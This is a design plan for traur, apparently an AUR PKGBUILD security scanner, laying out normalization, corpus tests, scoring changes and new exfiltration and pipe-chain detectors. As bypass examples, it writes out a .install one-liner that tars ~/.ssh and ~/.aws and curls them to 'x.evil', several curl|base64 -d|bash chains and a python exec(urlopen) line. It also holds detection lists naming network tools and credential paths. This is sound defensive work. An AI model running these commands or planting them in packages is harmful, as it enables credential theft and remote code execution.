# traur improvement plan

This plan replaces the "add more patterns" approach with scoped evidence. It is ordered so that
every claim becomes falsifiable before it changes a verdict, and so that the first shipped items
remove the false positives users complained about without removing detection.

Status: proposed. The three decisions that shaped it are settled in [Decisions](#decisions).

## Why the plan looks like this

Three measurements drive everything below. All of them were taken offline with
`traur scan --pkgbuild` against real PKGBUILDs, because the AUR RPC and AUR git endpoints are
unreachable from the development machine.

**1. On a 46-package benign corpus, 5 packages scored below OK.** Every one was a normal AUR
packaging convention being scored as if it were evidence:

| Package | Score | Signals | Why it is wrong |
|---|---|---|---|
| `vortex` | 55 SKETCHY | `P-SUID-BIT P-NPM-INSTALL-BUILDTIME G-DOWNLOAD-NODE G-NODE-INLINE` | npm as a build dependency is declared and normal |
| `llama.cpp-vulkan` | 59 SKETCHY | `P-SYSTEMD-CREATE P-NPM-INSTALL-BUILDTIME` | `install -Dm644 foo.service "$pkgdir/usr/lib/systemd/system/"` is the standard way to ship a unit |
| `voxtype-bin`, `whisper.cpp-vulkan` | 73 OK | `P-SYSTEMD-CREATE P-CHECKSUM-MISMATCH` | arch-specific checksum arrays are normal for `-bin` |
| `traur`, `traur-bin`, `vicinae` | 77 OK | `P-PACMAN-HOOK` | installing a pacman hook is the package's purpose |
| `zig0.14-bin` | 77 OK | `P-EVAL-VAR` | `eval "$pkgver"` has no command substitution |

`slack-desktop-wayland` and `vim-git` also fire `B-TYPOSQUAT` for being legitimate `-wayland`
and `-git` variants of `slack-desktop` and `vim`.

**2. Detection is silent on real attack shapes.** These produced high trust or merely SKETCHY:

| Input | Result |
|---|---|
| `.install` hook: `tar czf - /root/.ssh /root/.aws \| base64 -w0 \| xargs -I{} curl -s -d {} https://x.evil/c` | 89/100 TRUSTED |
| `source=("config.defaults")` where that committed file contains `$(curl … \| base64 -d \| bash)` | 86–100 TRUSTED |
| `install=evil.install` / `install = evil.install` | 86–89 TRUSTED, script never read |
| `eval "$(curl … \| base64 -d \| bash)"` | 55 SKETCHY, not gated |
| `python3 -c 'exec(urlopen(…).read())'` | 55 SKETCHY, not gated |
| payload inside `package_$pkgname-extra()` | 59 SKETCHY (not a parser gap: no exfil signal exists) |

**3. Fixes do not generalise because normalization is local.** `mask_checksum_arrays` and
`mask_header_comments` are private to `pkgbuild_analysis` (`src/features/pkgbuild_analysis/mod.rs:22,44`).
`gtfobins_analysis:24`, `install_script_analysis`, `shell_analysis:126`, `pkgbuild_diff_analysis`
and `source_url_analysis` all match raw text. Only `strip_quotes` is shared. That is why #12, #27
and #11 were each fixed once and still recur on other surfaces.

The corresponding user pain points are in [Pain-point traceability](#pain-point-traceability).

## Design principles

These are the durable choices. Each one exists to keep a class of false positive out of the code
rather than out of a regex.

1. **One normalization layer.** No feature matches raw PKGBUILD text. Checksum spans and leading
   header comments are masked, quotes are stripped, line counts are preserved. The layer is
   computed once per scan.
2. **`.SRCINFO` is the structural index; the PKGBUILD is the execution authority.** Neither is ever
   executed. `.SRCINFO` is shell-free and canonical, and all 46 cached clones contain one. When the
   two disagree, that disagreement is a signal.
3. **Evidence roles are orthogonal to signal categories.** `Fact`, `Capability`, `Composition`,
   `Provenance`, `OverrideGate`. Facts are declarations and lifecycle conventions and never add
   risk. Only compositions and the audited override list can gate.
4. **Regions are lexical, with a whole-file fallback.** A brace/quote/heredoc state machine finds
   `prepare()`, `build()`, `package()`, `package_$pkgname()`, arrays and heredoc spans. If
   segmentation cannot be trusted, the whole file is treated as code, which is today's behaviour.
   No shell parser.
5. **Capability is not intent; composition is intent.** `curl` alone is a capability. Reading
   `~/.ssh` and sending it out inside one region is a composition.
6. **Diff is adoption-aware and per-pattern.** AUR git authorship is self-asserted and unsigned, so
   a diff is conditioned on whether the package was adopted, not on a verified identity match.
7. **Metadata and provenance are suppressors only.** Votes, popularity, stars and age can reduce
   suspicion. The published compromise list is the only absolute.
8. **The JSON contract is additive, and inconclusive is a state.** `score`, `tier`,
   `signals[].id`, `override_gate_fired` stay stable because the `makepkg` wrapper parses them. New
   fields carry `schema_version`. A scan that could not complete reports `tier: "Unknown"` with a
   reason and `completeness`, because an inconclusive scan must never be rendered as a verdict.
9. **Corpus tests assert policy, not observed output.** A golden dump of today's results would
   bless today's false positives.

## Phases

### M0 — Measurement and liveness (blocking)

Every other item is unverifiable without this.

**M0.1 Offline corpus harness.** Certain win. Complexity: medium.
Adds `tests/corpus/manifest.toml`, `tests/corpus/pkgbuilds/<base>/` and `tests/corpus_cases.rs`.
Each manifest case supplies a PKGBUILD plus optional `.SRCINFO`, `.install` and local source files,
and synthetic `AurPackage`/`GitCommit` values from TOML, so all 16 features run with no network and
no git. Assertions are policy: `max_tier`, `required_signals`, `forbidden_signals`,
`allowed_signals`. Reports benign alert count at SKETCHY and above, recall per malicious class
(download-exec, decode-exec, exfil, source-exec, npm injection, persistence), per-signal benign and
malicious firing counts, and tier deltas against the previous manifest revision. A refresh script
copies from `~/.cache/paru/clone` and records `git -C <dir> log -1 --format=%H` per base.

The corpus has two halves, both required:

- **Benign, 46 real bases.** Committed under `tests/corpus/pkgbuilds/` with a `NOTICE` naming each
  base, its origin and its commit hash. This is the precision half; without it every rating change
  is unverifiable.
- **Malicious, incident-derived.** Committed under `tests/corpus/malicious/` with per-case
  provenance (incident name, date, source URL, commit hash where known): Atomic Arch (npm/bun
  injection, eBPF, cloud credential paths), the July `librewolf-fix-bin` / `firefox-patch-bin` /
  `zen-browser-patched-bin` campaign (payload in the `.install` script — the exact gap N2.3 and
  N3.3 close), the Google Chrome RAT `.install` Python download-and-execute, CHAOS RAT browser
  impersonation, and Acroread orphan takeover. The seven existing fixtures in
  `tests/fixtures/malicious/` are folded in with provenance rather than duplicated.

Capture procedure, documented in `tests/corpus/README.md`, because incident windows close: clone
immediately, record `git rev-parse HEAD`, extract each revision with
`git show <rev>:PKGBUILD` and `git show <rev>:<install>`, and keep the AUR git history as the
provenance record. AUR retains the malicious revision after the package is fixed, so this works
after the fact as long as someone still has a clone. Real C2 hosts are rewritten to
`https://c2.example/` in committed samples: the detectors match shape, not host, and no live
payload endpoint should be kept in the tree.

Proof: the 46 cached bases plus the incident cases plus the five bypass fixtures above.
Risk: none on the blocking path; test-only.

**M0.2 Signal-noise ledger.** Certain win. Complexity: low.
Reports `id, role, points, benign_hits, malicious_hits, cost = benign_hits × points` per signal,
grouped by package shape. This is the objective input to every demotion decision in N4.2, and it is
what turns "this signal is noisy" into a number.
Expected candidates: `P-SYSTEMD-CREATE`, `P-PACMAN-HOOK`, `P-SKIP-ALL`, `P-WEAK-CHECKSUMS`,
`P-CHECKSUM-MISMATCH`, `P-NPM-INSTALL-BUILDTIME`, `B-TYPOSQUAT`, `P-EVAL-VAR`.

**M0.3 CI, status and answer #26.** Certain win. Complexity: low.
Adds `.github/workflows/ci.yml` (only `release.yml` exists today) running `cargo test --locked`
plus the corpus report on PRs and pushes. Adds `STATUS.md` recording the release, corpus size,
known bypasses and maintenance policy, and `SECURITY.md`. Answers #26 with a pinned status, not a
promise of cadence. Fixes `README.md`, which says "12 independent features" while `all_features()`
registers 16.

Why this is a security item and not marketing: users deinstalled traur after #26, a malicious fork
(`consav121/traur`) impersonated the project, and users moved to `archcanary`. For a trust tool,
perceived abandonment is an attack surface.

### N1 — One normalization layer, plus targeted false-positive fixes

**N1.1 Shared `NormalizedView`.** Certain win. Complexity: medium.
New `src/shared/normalize.rs`, wired through `src/shared/mod.rs`, the `Feature` trait in
`src/features/mod.rs`, and every text feature. Computes `raw`, `masked` (checksum spans plus
leading header comments) and `plain` (quote-stripped) once per scan, preserving line counts.
`Feature::analyze` takes the view so each feature declares which text it reads. A test asserts no
feature reaches `ctx.pkgbuild_content` directly.

Why it works: masking removes only data bash cannot execute (hashes, leading comments); quote
stripping reconstructs the command bash will actually run. Both are lexical and independent of
package shape. While moving the code, replace `CHECKSUM_ARRAY_RE` (`(?ms)^\s*…=\s*\([^)]*\)`):
`[^)]*` stops at the first `)`, so an array containing `$(...)` is only partly masked, and `(?s)`
with `\s*` can cross lines. Span masking from the region scanner removes that class of bug.

Proof: a fixture whose sha512 contains a Monero-shaped run emits no `P-CRYPTO-WALLET` on any
surface, while the same string in `build()` still emits it. A header with base64-encoded
maintainer addresses emits nothing; base64 `eval` in `build()` still does.

**N1.2 Apply quote normalization everywhere.** Certain win. Complexity: low.
Applies to `gtfobins_analysis:24`, `install_script_analysis`, `shell_analysis:126`,
`pkgbuild_diff_analysis`. Proof: extend `tests/quote_split_bypass.rs` to cover `cu""rl|ba""sh`
inside `.install` and inside a local `source=` file.

**N1.3 Typosquat boundary fix.** Certain win. Complexity: low.
Strips one recognized AUR shape suffix (`-bin`, `-git`, `-svn`, `-hg`, `-debug`, `-wayland`,
`-vulkan`, `-headers`, `-libs`) before comparing against the top-package list. For containment,
requires the remainder to be an impersonation suffix (`-fix`, `-cracked`, …) or a single short
token, not any platform suffix.

Proof: `vim-git`, `slack-desktop-wayland`, `proton-ge-custom-bin` and `python-steam` stay clean;
`pary`, `yay2` and `firefox-fix` still fire. Not a gate, so no blocking risk.

### N2 — Structure the input without parsing bash

**N2.1 `.SRCINFO` parser.** Certain win. Complexity: medium.
New `src/shared/srcinfo.rs`, used from `src/coordinator.rs` and `src/main.rs`. Parses `pkgbase`,
`pkgname`, `source[_arch]`, `sha*sums[_arch]`, `install`, `depends`, `makedepends`, `validpgpkeys`.
Used to enumerate sources, map install scripts per split package, and cross-check the PKGBUILD.
Emits `B-SRCINFO-MISMATCH` when source names, `install=` or checksum presence disagree. A stale or
malicious `.SRCINFO` produces a mismatch signal, never a clean bill.

**N2.2 Region scanner with fallback.** Certain win. Complexity: medium.
New `src/shared/regions.rs`. A state machine over quotes, `${}` and heredocs identifies function
headers (`^\s*(function\s+)?[A-Za-z_][\w-]*\s*\(\s*\)\s*\{`), their matching `}`, arrays, heredoc
spans and top-level assignments. Returns `Region { kind, name, start, end, is_data }` and
`structure_ok`. When `structure_ok` is false, the whole file is one code region: today's behaviour,
so there is no recall regression on pathological input.

Proof: `package_a()`, `package_x-extra()`, `${var}` containing braces, a heredoc containing `}`,
and an unterminated function. The flutter-bin shape classifies its heredoc body as data.

**N2.3 `install=` resolution rewrite.** Certain win. Complexity: low.
`read_install_script` (`src/shared/aur_git.rs:86`) today requires a literal `install=` at line start
and joins the value verbatim, so `install = evil.install`,
`install="$pkgbase.install"` and multiple split-package install scripts are missed, and a failed
read returns `None` silently. Prefer `.SRCINFO`; otherwise parse `install\s*=\s*…` at top level and
inside `package_*()` regions, expand literal `$pkgname`/`${pkgname}`/`$pkgbase`, read every
referenced script, fall back to a `source=()` entry with the same basename, and emit
`P-INSTALL-UNRESOLVED` when nothing resolves. A missing install file is a genuine anomaly because
pacman will execute it.

Proof: fixtures `install_spaces`, `install_var`, `install_split`, `install_source_delivered`,
`install_missing`.

**N2.4 Analyze committed local `source=()` files.** Certain win for committed files.
Complexity: medium.
Adds `local_sources` to `PackageContext`, populates it in both context builders, and adds
`--dir` to the CLI. Takes relative and `file://` entries from `.SRCINFO`/PKGBUILD, canonicalizes
under the package directory, rejects `..` and symlink escapes, skips non-UTF-8 and files over
256 KiB, caps at 32 files. Runs the pkgbuild, gtfobins, install, shell and composition passes over
each with an `LS-` prefix and provenance, and detects `source`/`.` of a local entry inside a
function.

Why this is a top item: `source=` entries land in `$srcdir` and are executed at build time. A
committed `config.defaults` containing `curl | base64 -d | bash` currently scores 86–100 TRUSTED.

Proof: that case becomes SUSPICIOUS or above; a benign local patch stays OK; traversal fixture must
not read. Risk: the largest new I/O on the pre-transaction path, hence the canonicalization, size
caps and a `completeness.local_sources_capped` flag. `PackageContext` grows fields, so add `Default`
and migrate test literals mechanically.

### N3 — Close the verified recall holes

**N3.1 Classify the `eval` argument.** Certain win. Complexity: low.
New `analyze_eval` in `shell_analysis`, with `P-EVAL-VAR` demoted. Extract the argument up to a
top-level `;` or newline:

- a literal variable whose in-file value is literal → **fact**, zero risk (`eval "$pkgver"`)
- contains `$(` or a backtick whose inner text has network or decode → **composition gate**
- unknown variable or multiple words → small **capability**

This is deterministic and needs no population statistics: version strings never contain `$(`.
Proof: `eval "$pkgver"` clean; `eval "$(curl … | base64 -d | bash)"` gated;
`x=$(curl …); eval "$x"` resolves through the variable environment and gates.

**N3.2 Pipe-chain classifier.** Certain win. Complexity: low.
Splits each command region on top-level `|` and classifies stages: downloader (`curl`, `wget`,
`nc`, `socat`), decoder (`base64 -d`, `openssl -d`, `xxd -r`, `gzip -d`), executor (`sh`, `bash`,
`python`, `perl`, `ruby`, `source`, `.`). A downloader or decoder flowing into an executor emits
`SA-PIPE-DOWNLOAD-EXEC` / `SA-PIPE-DECODE-EXEC` as an override gate. The existing
`P-CURL-PIPE = curl\s[^|\n]*\|\s*(ba)?sh` cannot cross an intermediate `| base64 -d` stage, which
is exactly the gap above.

Proof: `decode_exec`, `curl_b64_sh`; `xz_tar` and `git_archive` stay clean.

**N3.3 Region-scoped capability composites.** Certain mechanism as a composition, calibration
conditional. Complexity: medium.
Extracts capabilities per region:

- `NetEgress`: curl/wget/nc/socat/ssh/scp/rsync to a remote host, python `urllib`/`socket`,
  `/dev/tcp`
- `SensitiveRead`: `~/.ssh`, `.aws`, `.netrc`, `.config/gh`, `.kube`, `.gnupg`, browser profiles,
  `/etc/shadow`, `env`/`printenv`
- `Exec`, `Decode`, `Persist`

Rules: `SensitiveRead ∧ NetEgress` in one region → `SA-EXFIL` gate; `SourceLocal ∧ Exec` →
`SA-SOURCE-LOCAL`; `Persist ∧ NetEgress` → indicator. Self-derived allowlist: when the egress host
matches a declared `source=` or `url=` host, downgrade. This is what closes the verified `.install`
exfiltration case, and it fires on the relationship rather than on a keyword, which is why it does
not re-introduce `SA-VAR-CONCAT-CMD` noise.

Risk: new gates on the hook path. Ship as indicators first; enable gates only when the corpus shows
zero benign alerts above OK.

**N3.4 Per-subpackage attribution.** Conditional; cut if the corpus does not need it.
Labels which `package_*()` region contains a composition. Reporting quality only: a malicious
subpackage already taints the package.

### N4 — Scoring model and diff

**N4.1 Evidence roles.** Certain mechanism. Complexity: medium.
Adds `SignalRole { Fact, Capability, Composition, OverrideGate, Provenance }` in
`src/shared/scoring.rs` and the role table, orthogonal to the existing four categories so
`ignored.categories` and the JSON category strings stay stable. `compute_score`: facts go to a
capped hygiene bucket at low weight and never gate; capabilities use today's weighted categories;
compositions gate; provenance only suppresses. Adds `schema_version`.

Proof: corpus benign alerts fall; traur's own PKGBUILD reaches OK or better; every malicious
fixture keeps its tier. Uses `schema_version: 2` per the settled score decision.

**N4.2 Conditional facts.** Conditional on the M0.2 ledger. Complexity: low.

- `P-SKIP-ALL` → fact for `-bin`/VCS (or no compile step), indicator otherwise
- `P-WEAK-CHECKSUMS` → fact always
- `P-CHECKSUM-MISMATCH` → fact when explained by arch arrays, `SKIP`, or `-bin`; indicator when a
  non-arch array is genuinely short
- `P-SYSTEMD-CREATE`, `P-PACMAN-HOOK` → fact; the installed unit or hook *content* is what matters
- `P-NPM-INSTALL-BUILDTIME` → fact when `npm` is in `makedepends` and no remote tarball is present;
  indicator otherwise. `P-NPM-REMOTE-TARBALL` and the credential patterns keep Atomic Arch coverage

**N4.3 Diff rewrite.** Certain mechanics; identity conditioning is not recommended.
Complexity: medium.
Uses normalized views; diffs **all** pattern sections (today only `pkgbuild_analysis` with
points ≥ 60, so no `G-` or `IS-` pattern can ever appear in a diff); emits `T-DIFF-<pattern_id>`
with damped points, no gate; dedupes; never lowers risk. When `B-ORPHAN-TAKEOVER` or
`B-SUBMITTER-CHANGED` is present, or the latest author is absent from prior history, downgrades diff
findings to facts and treats the diff as a new baseline.

AUR git author name and email are self-asserted and unsigned, so there is no verified identity to
condition on. Adoption is the observable proxy. Proof: the #11 shape (a wallet-like hash present in
both versions) emits no diff signal; a genuinely new `curl|bash` emits
`T-DIFF-P-CURL-PIPE`; an adoption fixture no longer escalates on churn alone.

**N4.4 Completeness, typed errors, and the `Unknown` state.** Certain win. Complexity: low.
Adds `ContextError { Network, NotFound, Git, Parse, Io }`. A failed RPC batch marks its names
**Unknown**, never `NotFound`; today only a total outage is caught (`bulk.rs:22`), so a partial
outage silently skips packages. Adds `ScanResult.completeness { metadata, pkgbuild, srcinfo,
install_scripts, local_sources, git_history }`, `status`, `reason` and `assumptions`, additive.
Metadata votes and popularity may only suppress name and metadata signals. This resolves #24.

There are three outcomes, not two:

| Outcome | Cause | Behaviour |
|---|---|---|
| verdict | scan completed | existing tier policy; MALICIOUS always blocks |
| **`Unknown`** | network failure, unreadable PKGBUILD, unresolved install script, truncated clone | state that traur cannot conclude, name the missing inputs, and prompt |
| error | local I/O or usage error | fail closed as today |

`Unknown` is deliberately **not** a score. It must never be rendered as SUSPICIOUS (the package
was not judged) and never as TRUSTED (it was not verified). The user-facing text says what happened
and why: `AUR unreachable — network failure; scan incomplete`, followed by which evidence is
missing. In JSON this is `tier: "Unknown"`, `status: "incomplete"`, and the reason field. The
`makepkg` wrapper treats `Unknown` as prompt-worthy, which its current
`[[ "$tier" != "Trusted" ]]` check already does.

Invariant: a metadata failure may produce `Unknown`. It may never produce `TRUSTED`, and it may
never be reported as `SUSPICIOUS`.

**N4.5 Session escape hatch for inconclusive scans.** Certain win. Complexity: low.
Repeated approval during a network outage is what made #24 painful, so the prompt for an `Unknown`
scan offers three answers: allow once, allow for this session, or no.

- Mechanism: a root-owned state file (`/var/lib/traur/session-allow`, mode 0600) recording the
  grant. The hook runs as root, so an unprivileged user cannot forge it.
- Scope: it applies **only** to the `Unknown` state. It must never bypass a scored
  SUSPICIOUS or MALICIOUS verdict, and it must never act as a package whitelist. An allow-once
  grant is consumed by the current transaction.
- Lifetime: revoked automatically by the next successful AUR fetch, and on reboot. The escape hatch
  therefore exists only while the condition that justified it still holds. `TRAUR_ALLOW_OFFLINE=1`
  remains the unattended equivalent.
- Non-interactive with no tty and no grant: block.

Proof: simulated network failure with a present clone yields `Unknown` and the three-way prompt;
a `MALICIOUS` verdict in a second package in the same transaction still blocks despite a stored
grant; a successful fetch clears the file.

### N5 — Operational correctness

**N5.1 `makepkg` wrapper.** Certain win. Complexity: low.
One `traur scan --dir "$PWD" --json` run; render the human report from the parsed JSON; prompt only
on SKETCHY and above, matching hook policy (today it prompts on OK, the #19 complaint); define
non-interactive behaviour when `/dev/tty` cannot be opened (pass through at OK or below, block at
SKETCHY and above, and block on `Unknown`); keep the `--printsrcinfo` and query pass-through list.
Pre-build the AUR is reachable far more often than inside the transaction, so `Unknown` should be
rare here; when it happens, the message must say the scan was inconclusive rather than implying a
verdict.

**N5.2 `-debug` and split-name resolution.** Conditional. Complexity: low.
When a name is not found, retry via `package_base` or strip a `-debug` suffix and scan the base, and
label the result. Needs a live AUR query to confirm RPC behaviour for generated names; safe default
is to scan the stripped base and label it.

**N5.3 Compromise-list fail-open.** Certain win. Complexity: low.
Keeps the last successful list indefinitely with a `list_age`, so a failed refresh after 12 hours
cannot turn a previously listed package into "not listed". Adds `B-MALICIOUS-LIST-STALE` as a fact.

**N5.4 Whitelist regression test.** Certain win. Complexity: low.
`SUDO_USER`/`DOAS_USER` resolution already exists in `src/shared/config.rs`; add a test so #4 cannot
regress, and refactor `config_path_from(env)` for testability instead of mutating process env.

## Confidence classification

| Item | Confidence | Complexity | Depends on |
|---|---|---|---|
| M0.1 corpus harness | certain | medium | open decision 2 |
| M0.2 signal ledger | certain | low | M0.1 |
| M0.3 CI / status / #26 | certain | low | — |
| N1.1 shared normalization | certain | medium | — |
| N1.2 quote normalization everywhere | certain | low | N1.1 |
| N1.3 typosquat boundary | certain | low | M0.1 for proof |
| N2.1 `.SRCINFO` parser | certain | medium | — |
| N2.2 region scanner + fallback | certain | medium | — |
| N2.3 `install=` resolution | certain | low | N2.1, N2.2 |
| N2.4 committed local sources | certain for committed files | medium | N2.1, N2.2 |
| N3.1 eval classification | certain | low | N2.2 |
| N3.2 pipe chains | certain | low | N1.1 |
| N3.3 capability composites | certain mechanism, calibration conditional | medium | N2.2, M0.1 |
| N3.4 subpackage attribution | conditional | low | N2.2 |
| N4.1 evidence roles | certain mechanism | medium | M0.2, open decision 1 |
| N4.2 conditional facts | conditional on ledger | low | M0.2, N4.1 |
| N4.3 diff rewrite | certain mechanics | medium | N1.1, N2.1 |
| N4.4 completeness / typed errors / `Unknown` | certain | low | — |
| N4.5 session escape hatch | certain | low | N4.4 |
| N5.1 wrapper | certain | low | N2.4, N4.4 |
| N5.2 `-debug` resolution | conditional | low | live AUR check |
| N5.3 list fallback | certain | low | — |
| N5.4 whitelist test | certain | low | — |

Cut entirely: ML classifier, sandboxed build, population baselines, signature verification, hash
reputation, binary AV scanning. Reasons in [Do not do](#do-not-do).

## Pain-point traceability

| Pain point | Plan item | Status |
|---|---|---|
| #2 install scripts not analysed | N2.3, N3.3 | resolved for spaced, variable, split and source-delivered forms |
| #3 unverified chmod | M0.3, N5.4 | verification only; packaging already changed |
| #4 whitelist broken | N5.4 | locked with a regression test |
| #5 `-debug` not on AUR | N5.2 | conditional; safe default scans the stripped base |
| #6 prompt ergonomics | N5.1 | wrapper's OK prompt only; policy unchanged by intent |
| #8 daemon | — | deliberately not resolved; timer and notify already exist |
| #10 reproducible release | M0.3 | mostly done in `release.yml`; add PR CI |
| #11, #27 checksum / wallet FP | N1.1, N4.1, N4.3 | resolved |
| #12 header base64 FP | N1.1 | resolved on every surface |
| #13 flutter-bin heredoc and `::` | N1.1, N2.2, N4.2 | resolved |
| #16 scan before build | N5.1, N2.4 | partial; downloaded sources are unavailable pre-build |
| #17 compromise list | N4.1, N5.3 | resolved with stale fallback |
| #19 wrapper hang | N5.1 | resolved with a single run and a non-interactive policy |
| #23 quote splitting | N1.2, N3.2 | resolved, including decode chains |
| #24 CachyOS isolation | N4.4, N4.5 | resolved: `Unknown` state, not SUSPICIOUS; session allow avoids per-package prompts |
| #25 Atomic Arch | N4.2 | preserved; npm becomes a conditional fact |
| #26 abandoned | M0.3 | resolved as a process and an artifact |
| FIX 5 `SA-VAR-CONCAT-CMD` noisy | N3.1, N3.3 | resolved through composition, not keywords |
| FIX 6 checksum wording | N2.1, N4.2 | resolved |
| FIX 7 cross-array count | N2.1, N4.2 | resolved |
| FIX 8 "big grep" | M0.2, N2.2, N3.3 | addressed structurally and in output |
| FIX 9, 10 branding and ALPM wording | M0.3 | documentation |
| FIX 11 Rust `--frozen` | — | already handled by fetch-in-prepare |

Deliberately out of scope: #6 policy, #8 daemon, dynamic sandbox, official-repo packages, upstream
attestation, binary AV.

## Do not do

1. **A full bash parser as the core.** PKGBUILDs are computed bash; parse failures are common and a
   parser still does not answer "is this exfiltration". Regions plus fallback.
2. **`source PKGBUILD` or executing `makepkg --printsrcinfo` on untrusted input.** That runs
   arbitrary code.
3. **An ML classifier trained on the public compromise list.** Tiny positive class, concept drift,
   unexplainable verdicts, and the campaign is already public.
4. **Population deviation baselines.** AUR is heterogeneous: `-bin` fetches tarballs, `-git` clones,
   source builds compile, and `.service` conventions vary by maintainer.
5. **Rebuild-from-source provenance.** There is no registry artifact for `-bin`, and `-git` has no
   checksum. Amalfi-style reproduction does not transfer.
6. **AUR git signature verification.** AUR does not sign commits; authorship is self-asserted.
7. **A content-hash reputation database.** A PKGBUILD hash changes on every version bump and there
   is no central PKGBUILD registry.
8. **Entropy thresholds on tarballs or binaries.** Legitimate compiler and firmware payloads are
   high entropy; flutter-bin is the proof.
9. **Blocking on votes or popularity.** google-chrome and paru are legitimate with corporate and
   upstream maintainers.
10. **A sandboxed build as a gate.** Heavy, non-deterministic, and AUR helpers already run as the
    user.
11. **Making dismissal easier.** The maintainer's stance on #6 is explicit.
12. **Treating `.SRCINFO` as the content oracle.** It is an index; disagreement is a signal.

## Decisions

### Settled

1. **Score semantics.** Ship `schema_version: 2` with re-based scores. Facts stop adding risk.
   `score`, `tier`, `signals[].id` and `override_gate_fired` stay stable; the changelog explains
   the re-base. Source: user decision.
2. **Corpus.** Commit the 46 cached benign PKGBUILDs with a `NOTICE` and per-base commit hash, and
   add incident-derived malicious samples (Atomic Arch, the July `.install` campaign, Google Chrome
   RAT, CHAOS RAT, Acroread) with provenance. Source: user decision.
3. **Hook failure mode.** A network failure produces the `Unknown` state, never SUSPICIOUS and
   never TRUSTED. The prompt offers allow once, allow for this session, or no, and a session grant
   is scoped to `Unknown` only and revoked on the next successful fetch or on reboot.
   `TRAUR_ALLOW_OFFLINE=1` is the unattended equivalent. Source: user decision.

### Defaults taken (reversible, no answer needed)

4. **`.SRCINFO` mismatch** is a scored indicator at low points, never a gate. It is a signal, not a
   parse error, because a stale or malicious `.SRCINFO` is itself informative.
5. **Build-time `npm install`** is a fact when `npm` appears in `makedepends` and no remote tarball
   is present; otherwise an indicator. `P-NPM-REMOTE-TARBALL` and the credential patterns keep
   Atomic Arch coverage either way.

### Assumption to confirm at implementation

"This session" is implemented as *until the next successful AUR fetch, or reboot, whichever comes
first*, so the grant cannot outlive the condition that justified it. If the intent is a fixed time
window instead, only the expiry calculation in N4.5 changes.

## Corrections to the earlier research brief

Five claims from the first analysis were wrong or overstated. They are recorded here so the plan
does not repeat them.

1. **"Split packages are a blind spot."** Every function body is already in one text blob and is
   matched. The `package_$pkgname-extra()` payload scored 59 because no exfiltration signal exists,
   not because the parser skipped a function. N3.3 fixes the cause; N3.4 is reporting only.
2. **"`install=` is never resolved."** A literal `install=` at line start *is* read
   (`aur_git.rs:96`). The real gaps are spaced and variable forms, multiple split-package scripts,
   and a failed read returning `None` with no signal. N2.3 is the precise fix.
3. **"Condition the diff on maintainer identity."** Not implementable: AUR authorship is
   self-asserted and unsigned. Condition on the adoption composite instead (N4.3).
4. **"Masking checksum arrays works."** The regex is weaker than assumed: `[^)]*` stops at the first
   `)`, and `(?s)` with `^\s*` can cross lines. Replace with span masking from the region scanner.
5. **"Diff is the strongest AUR signal."** It is the strongest *change* signal. After an orphan
   adoption it mostly measures "changed a lot", which is what #11's 83% rewrite did.

Two claims stand unchanged and are the reason for N2.4 and N3.3: committed `source=` files are an
unanalysed execution channel, and the `.install` exfiltration path scores TRUSTED today.
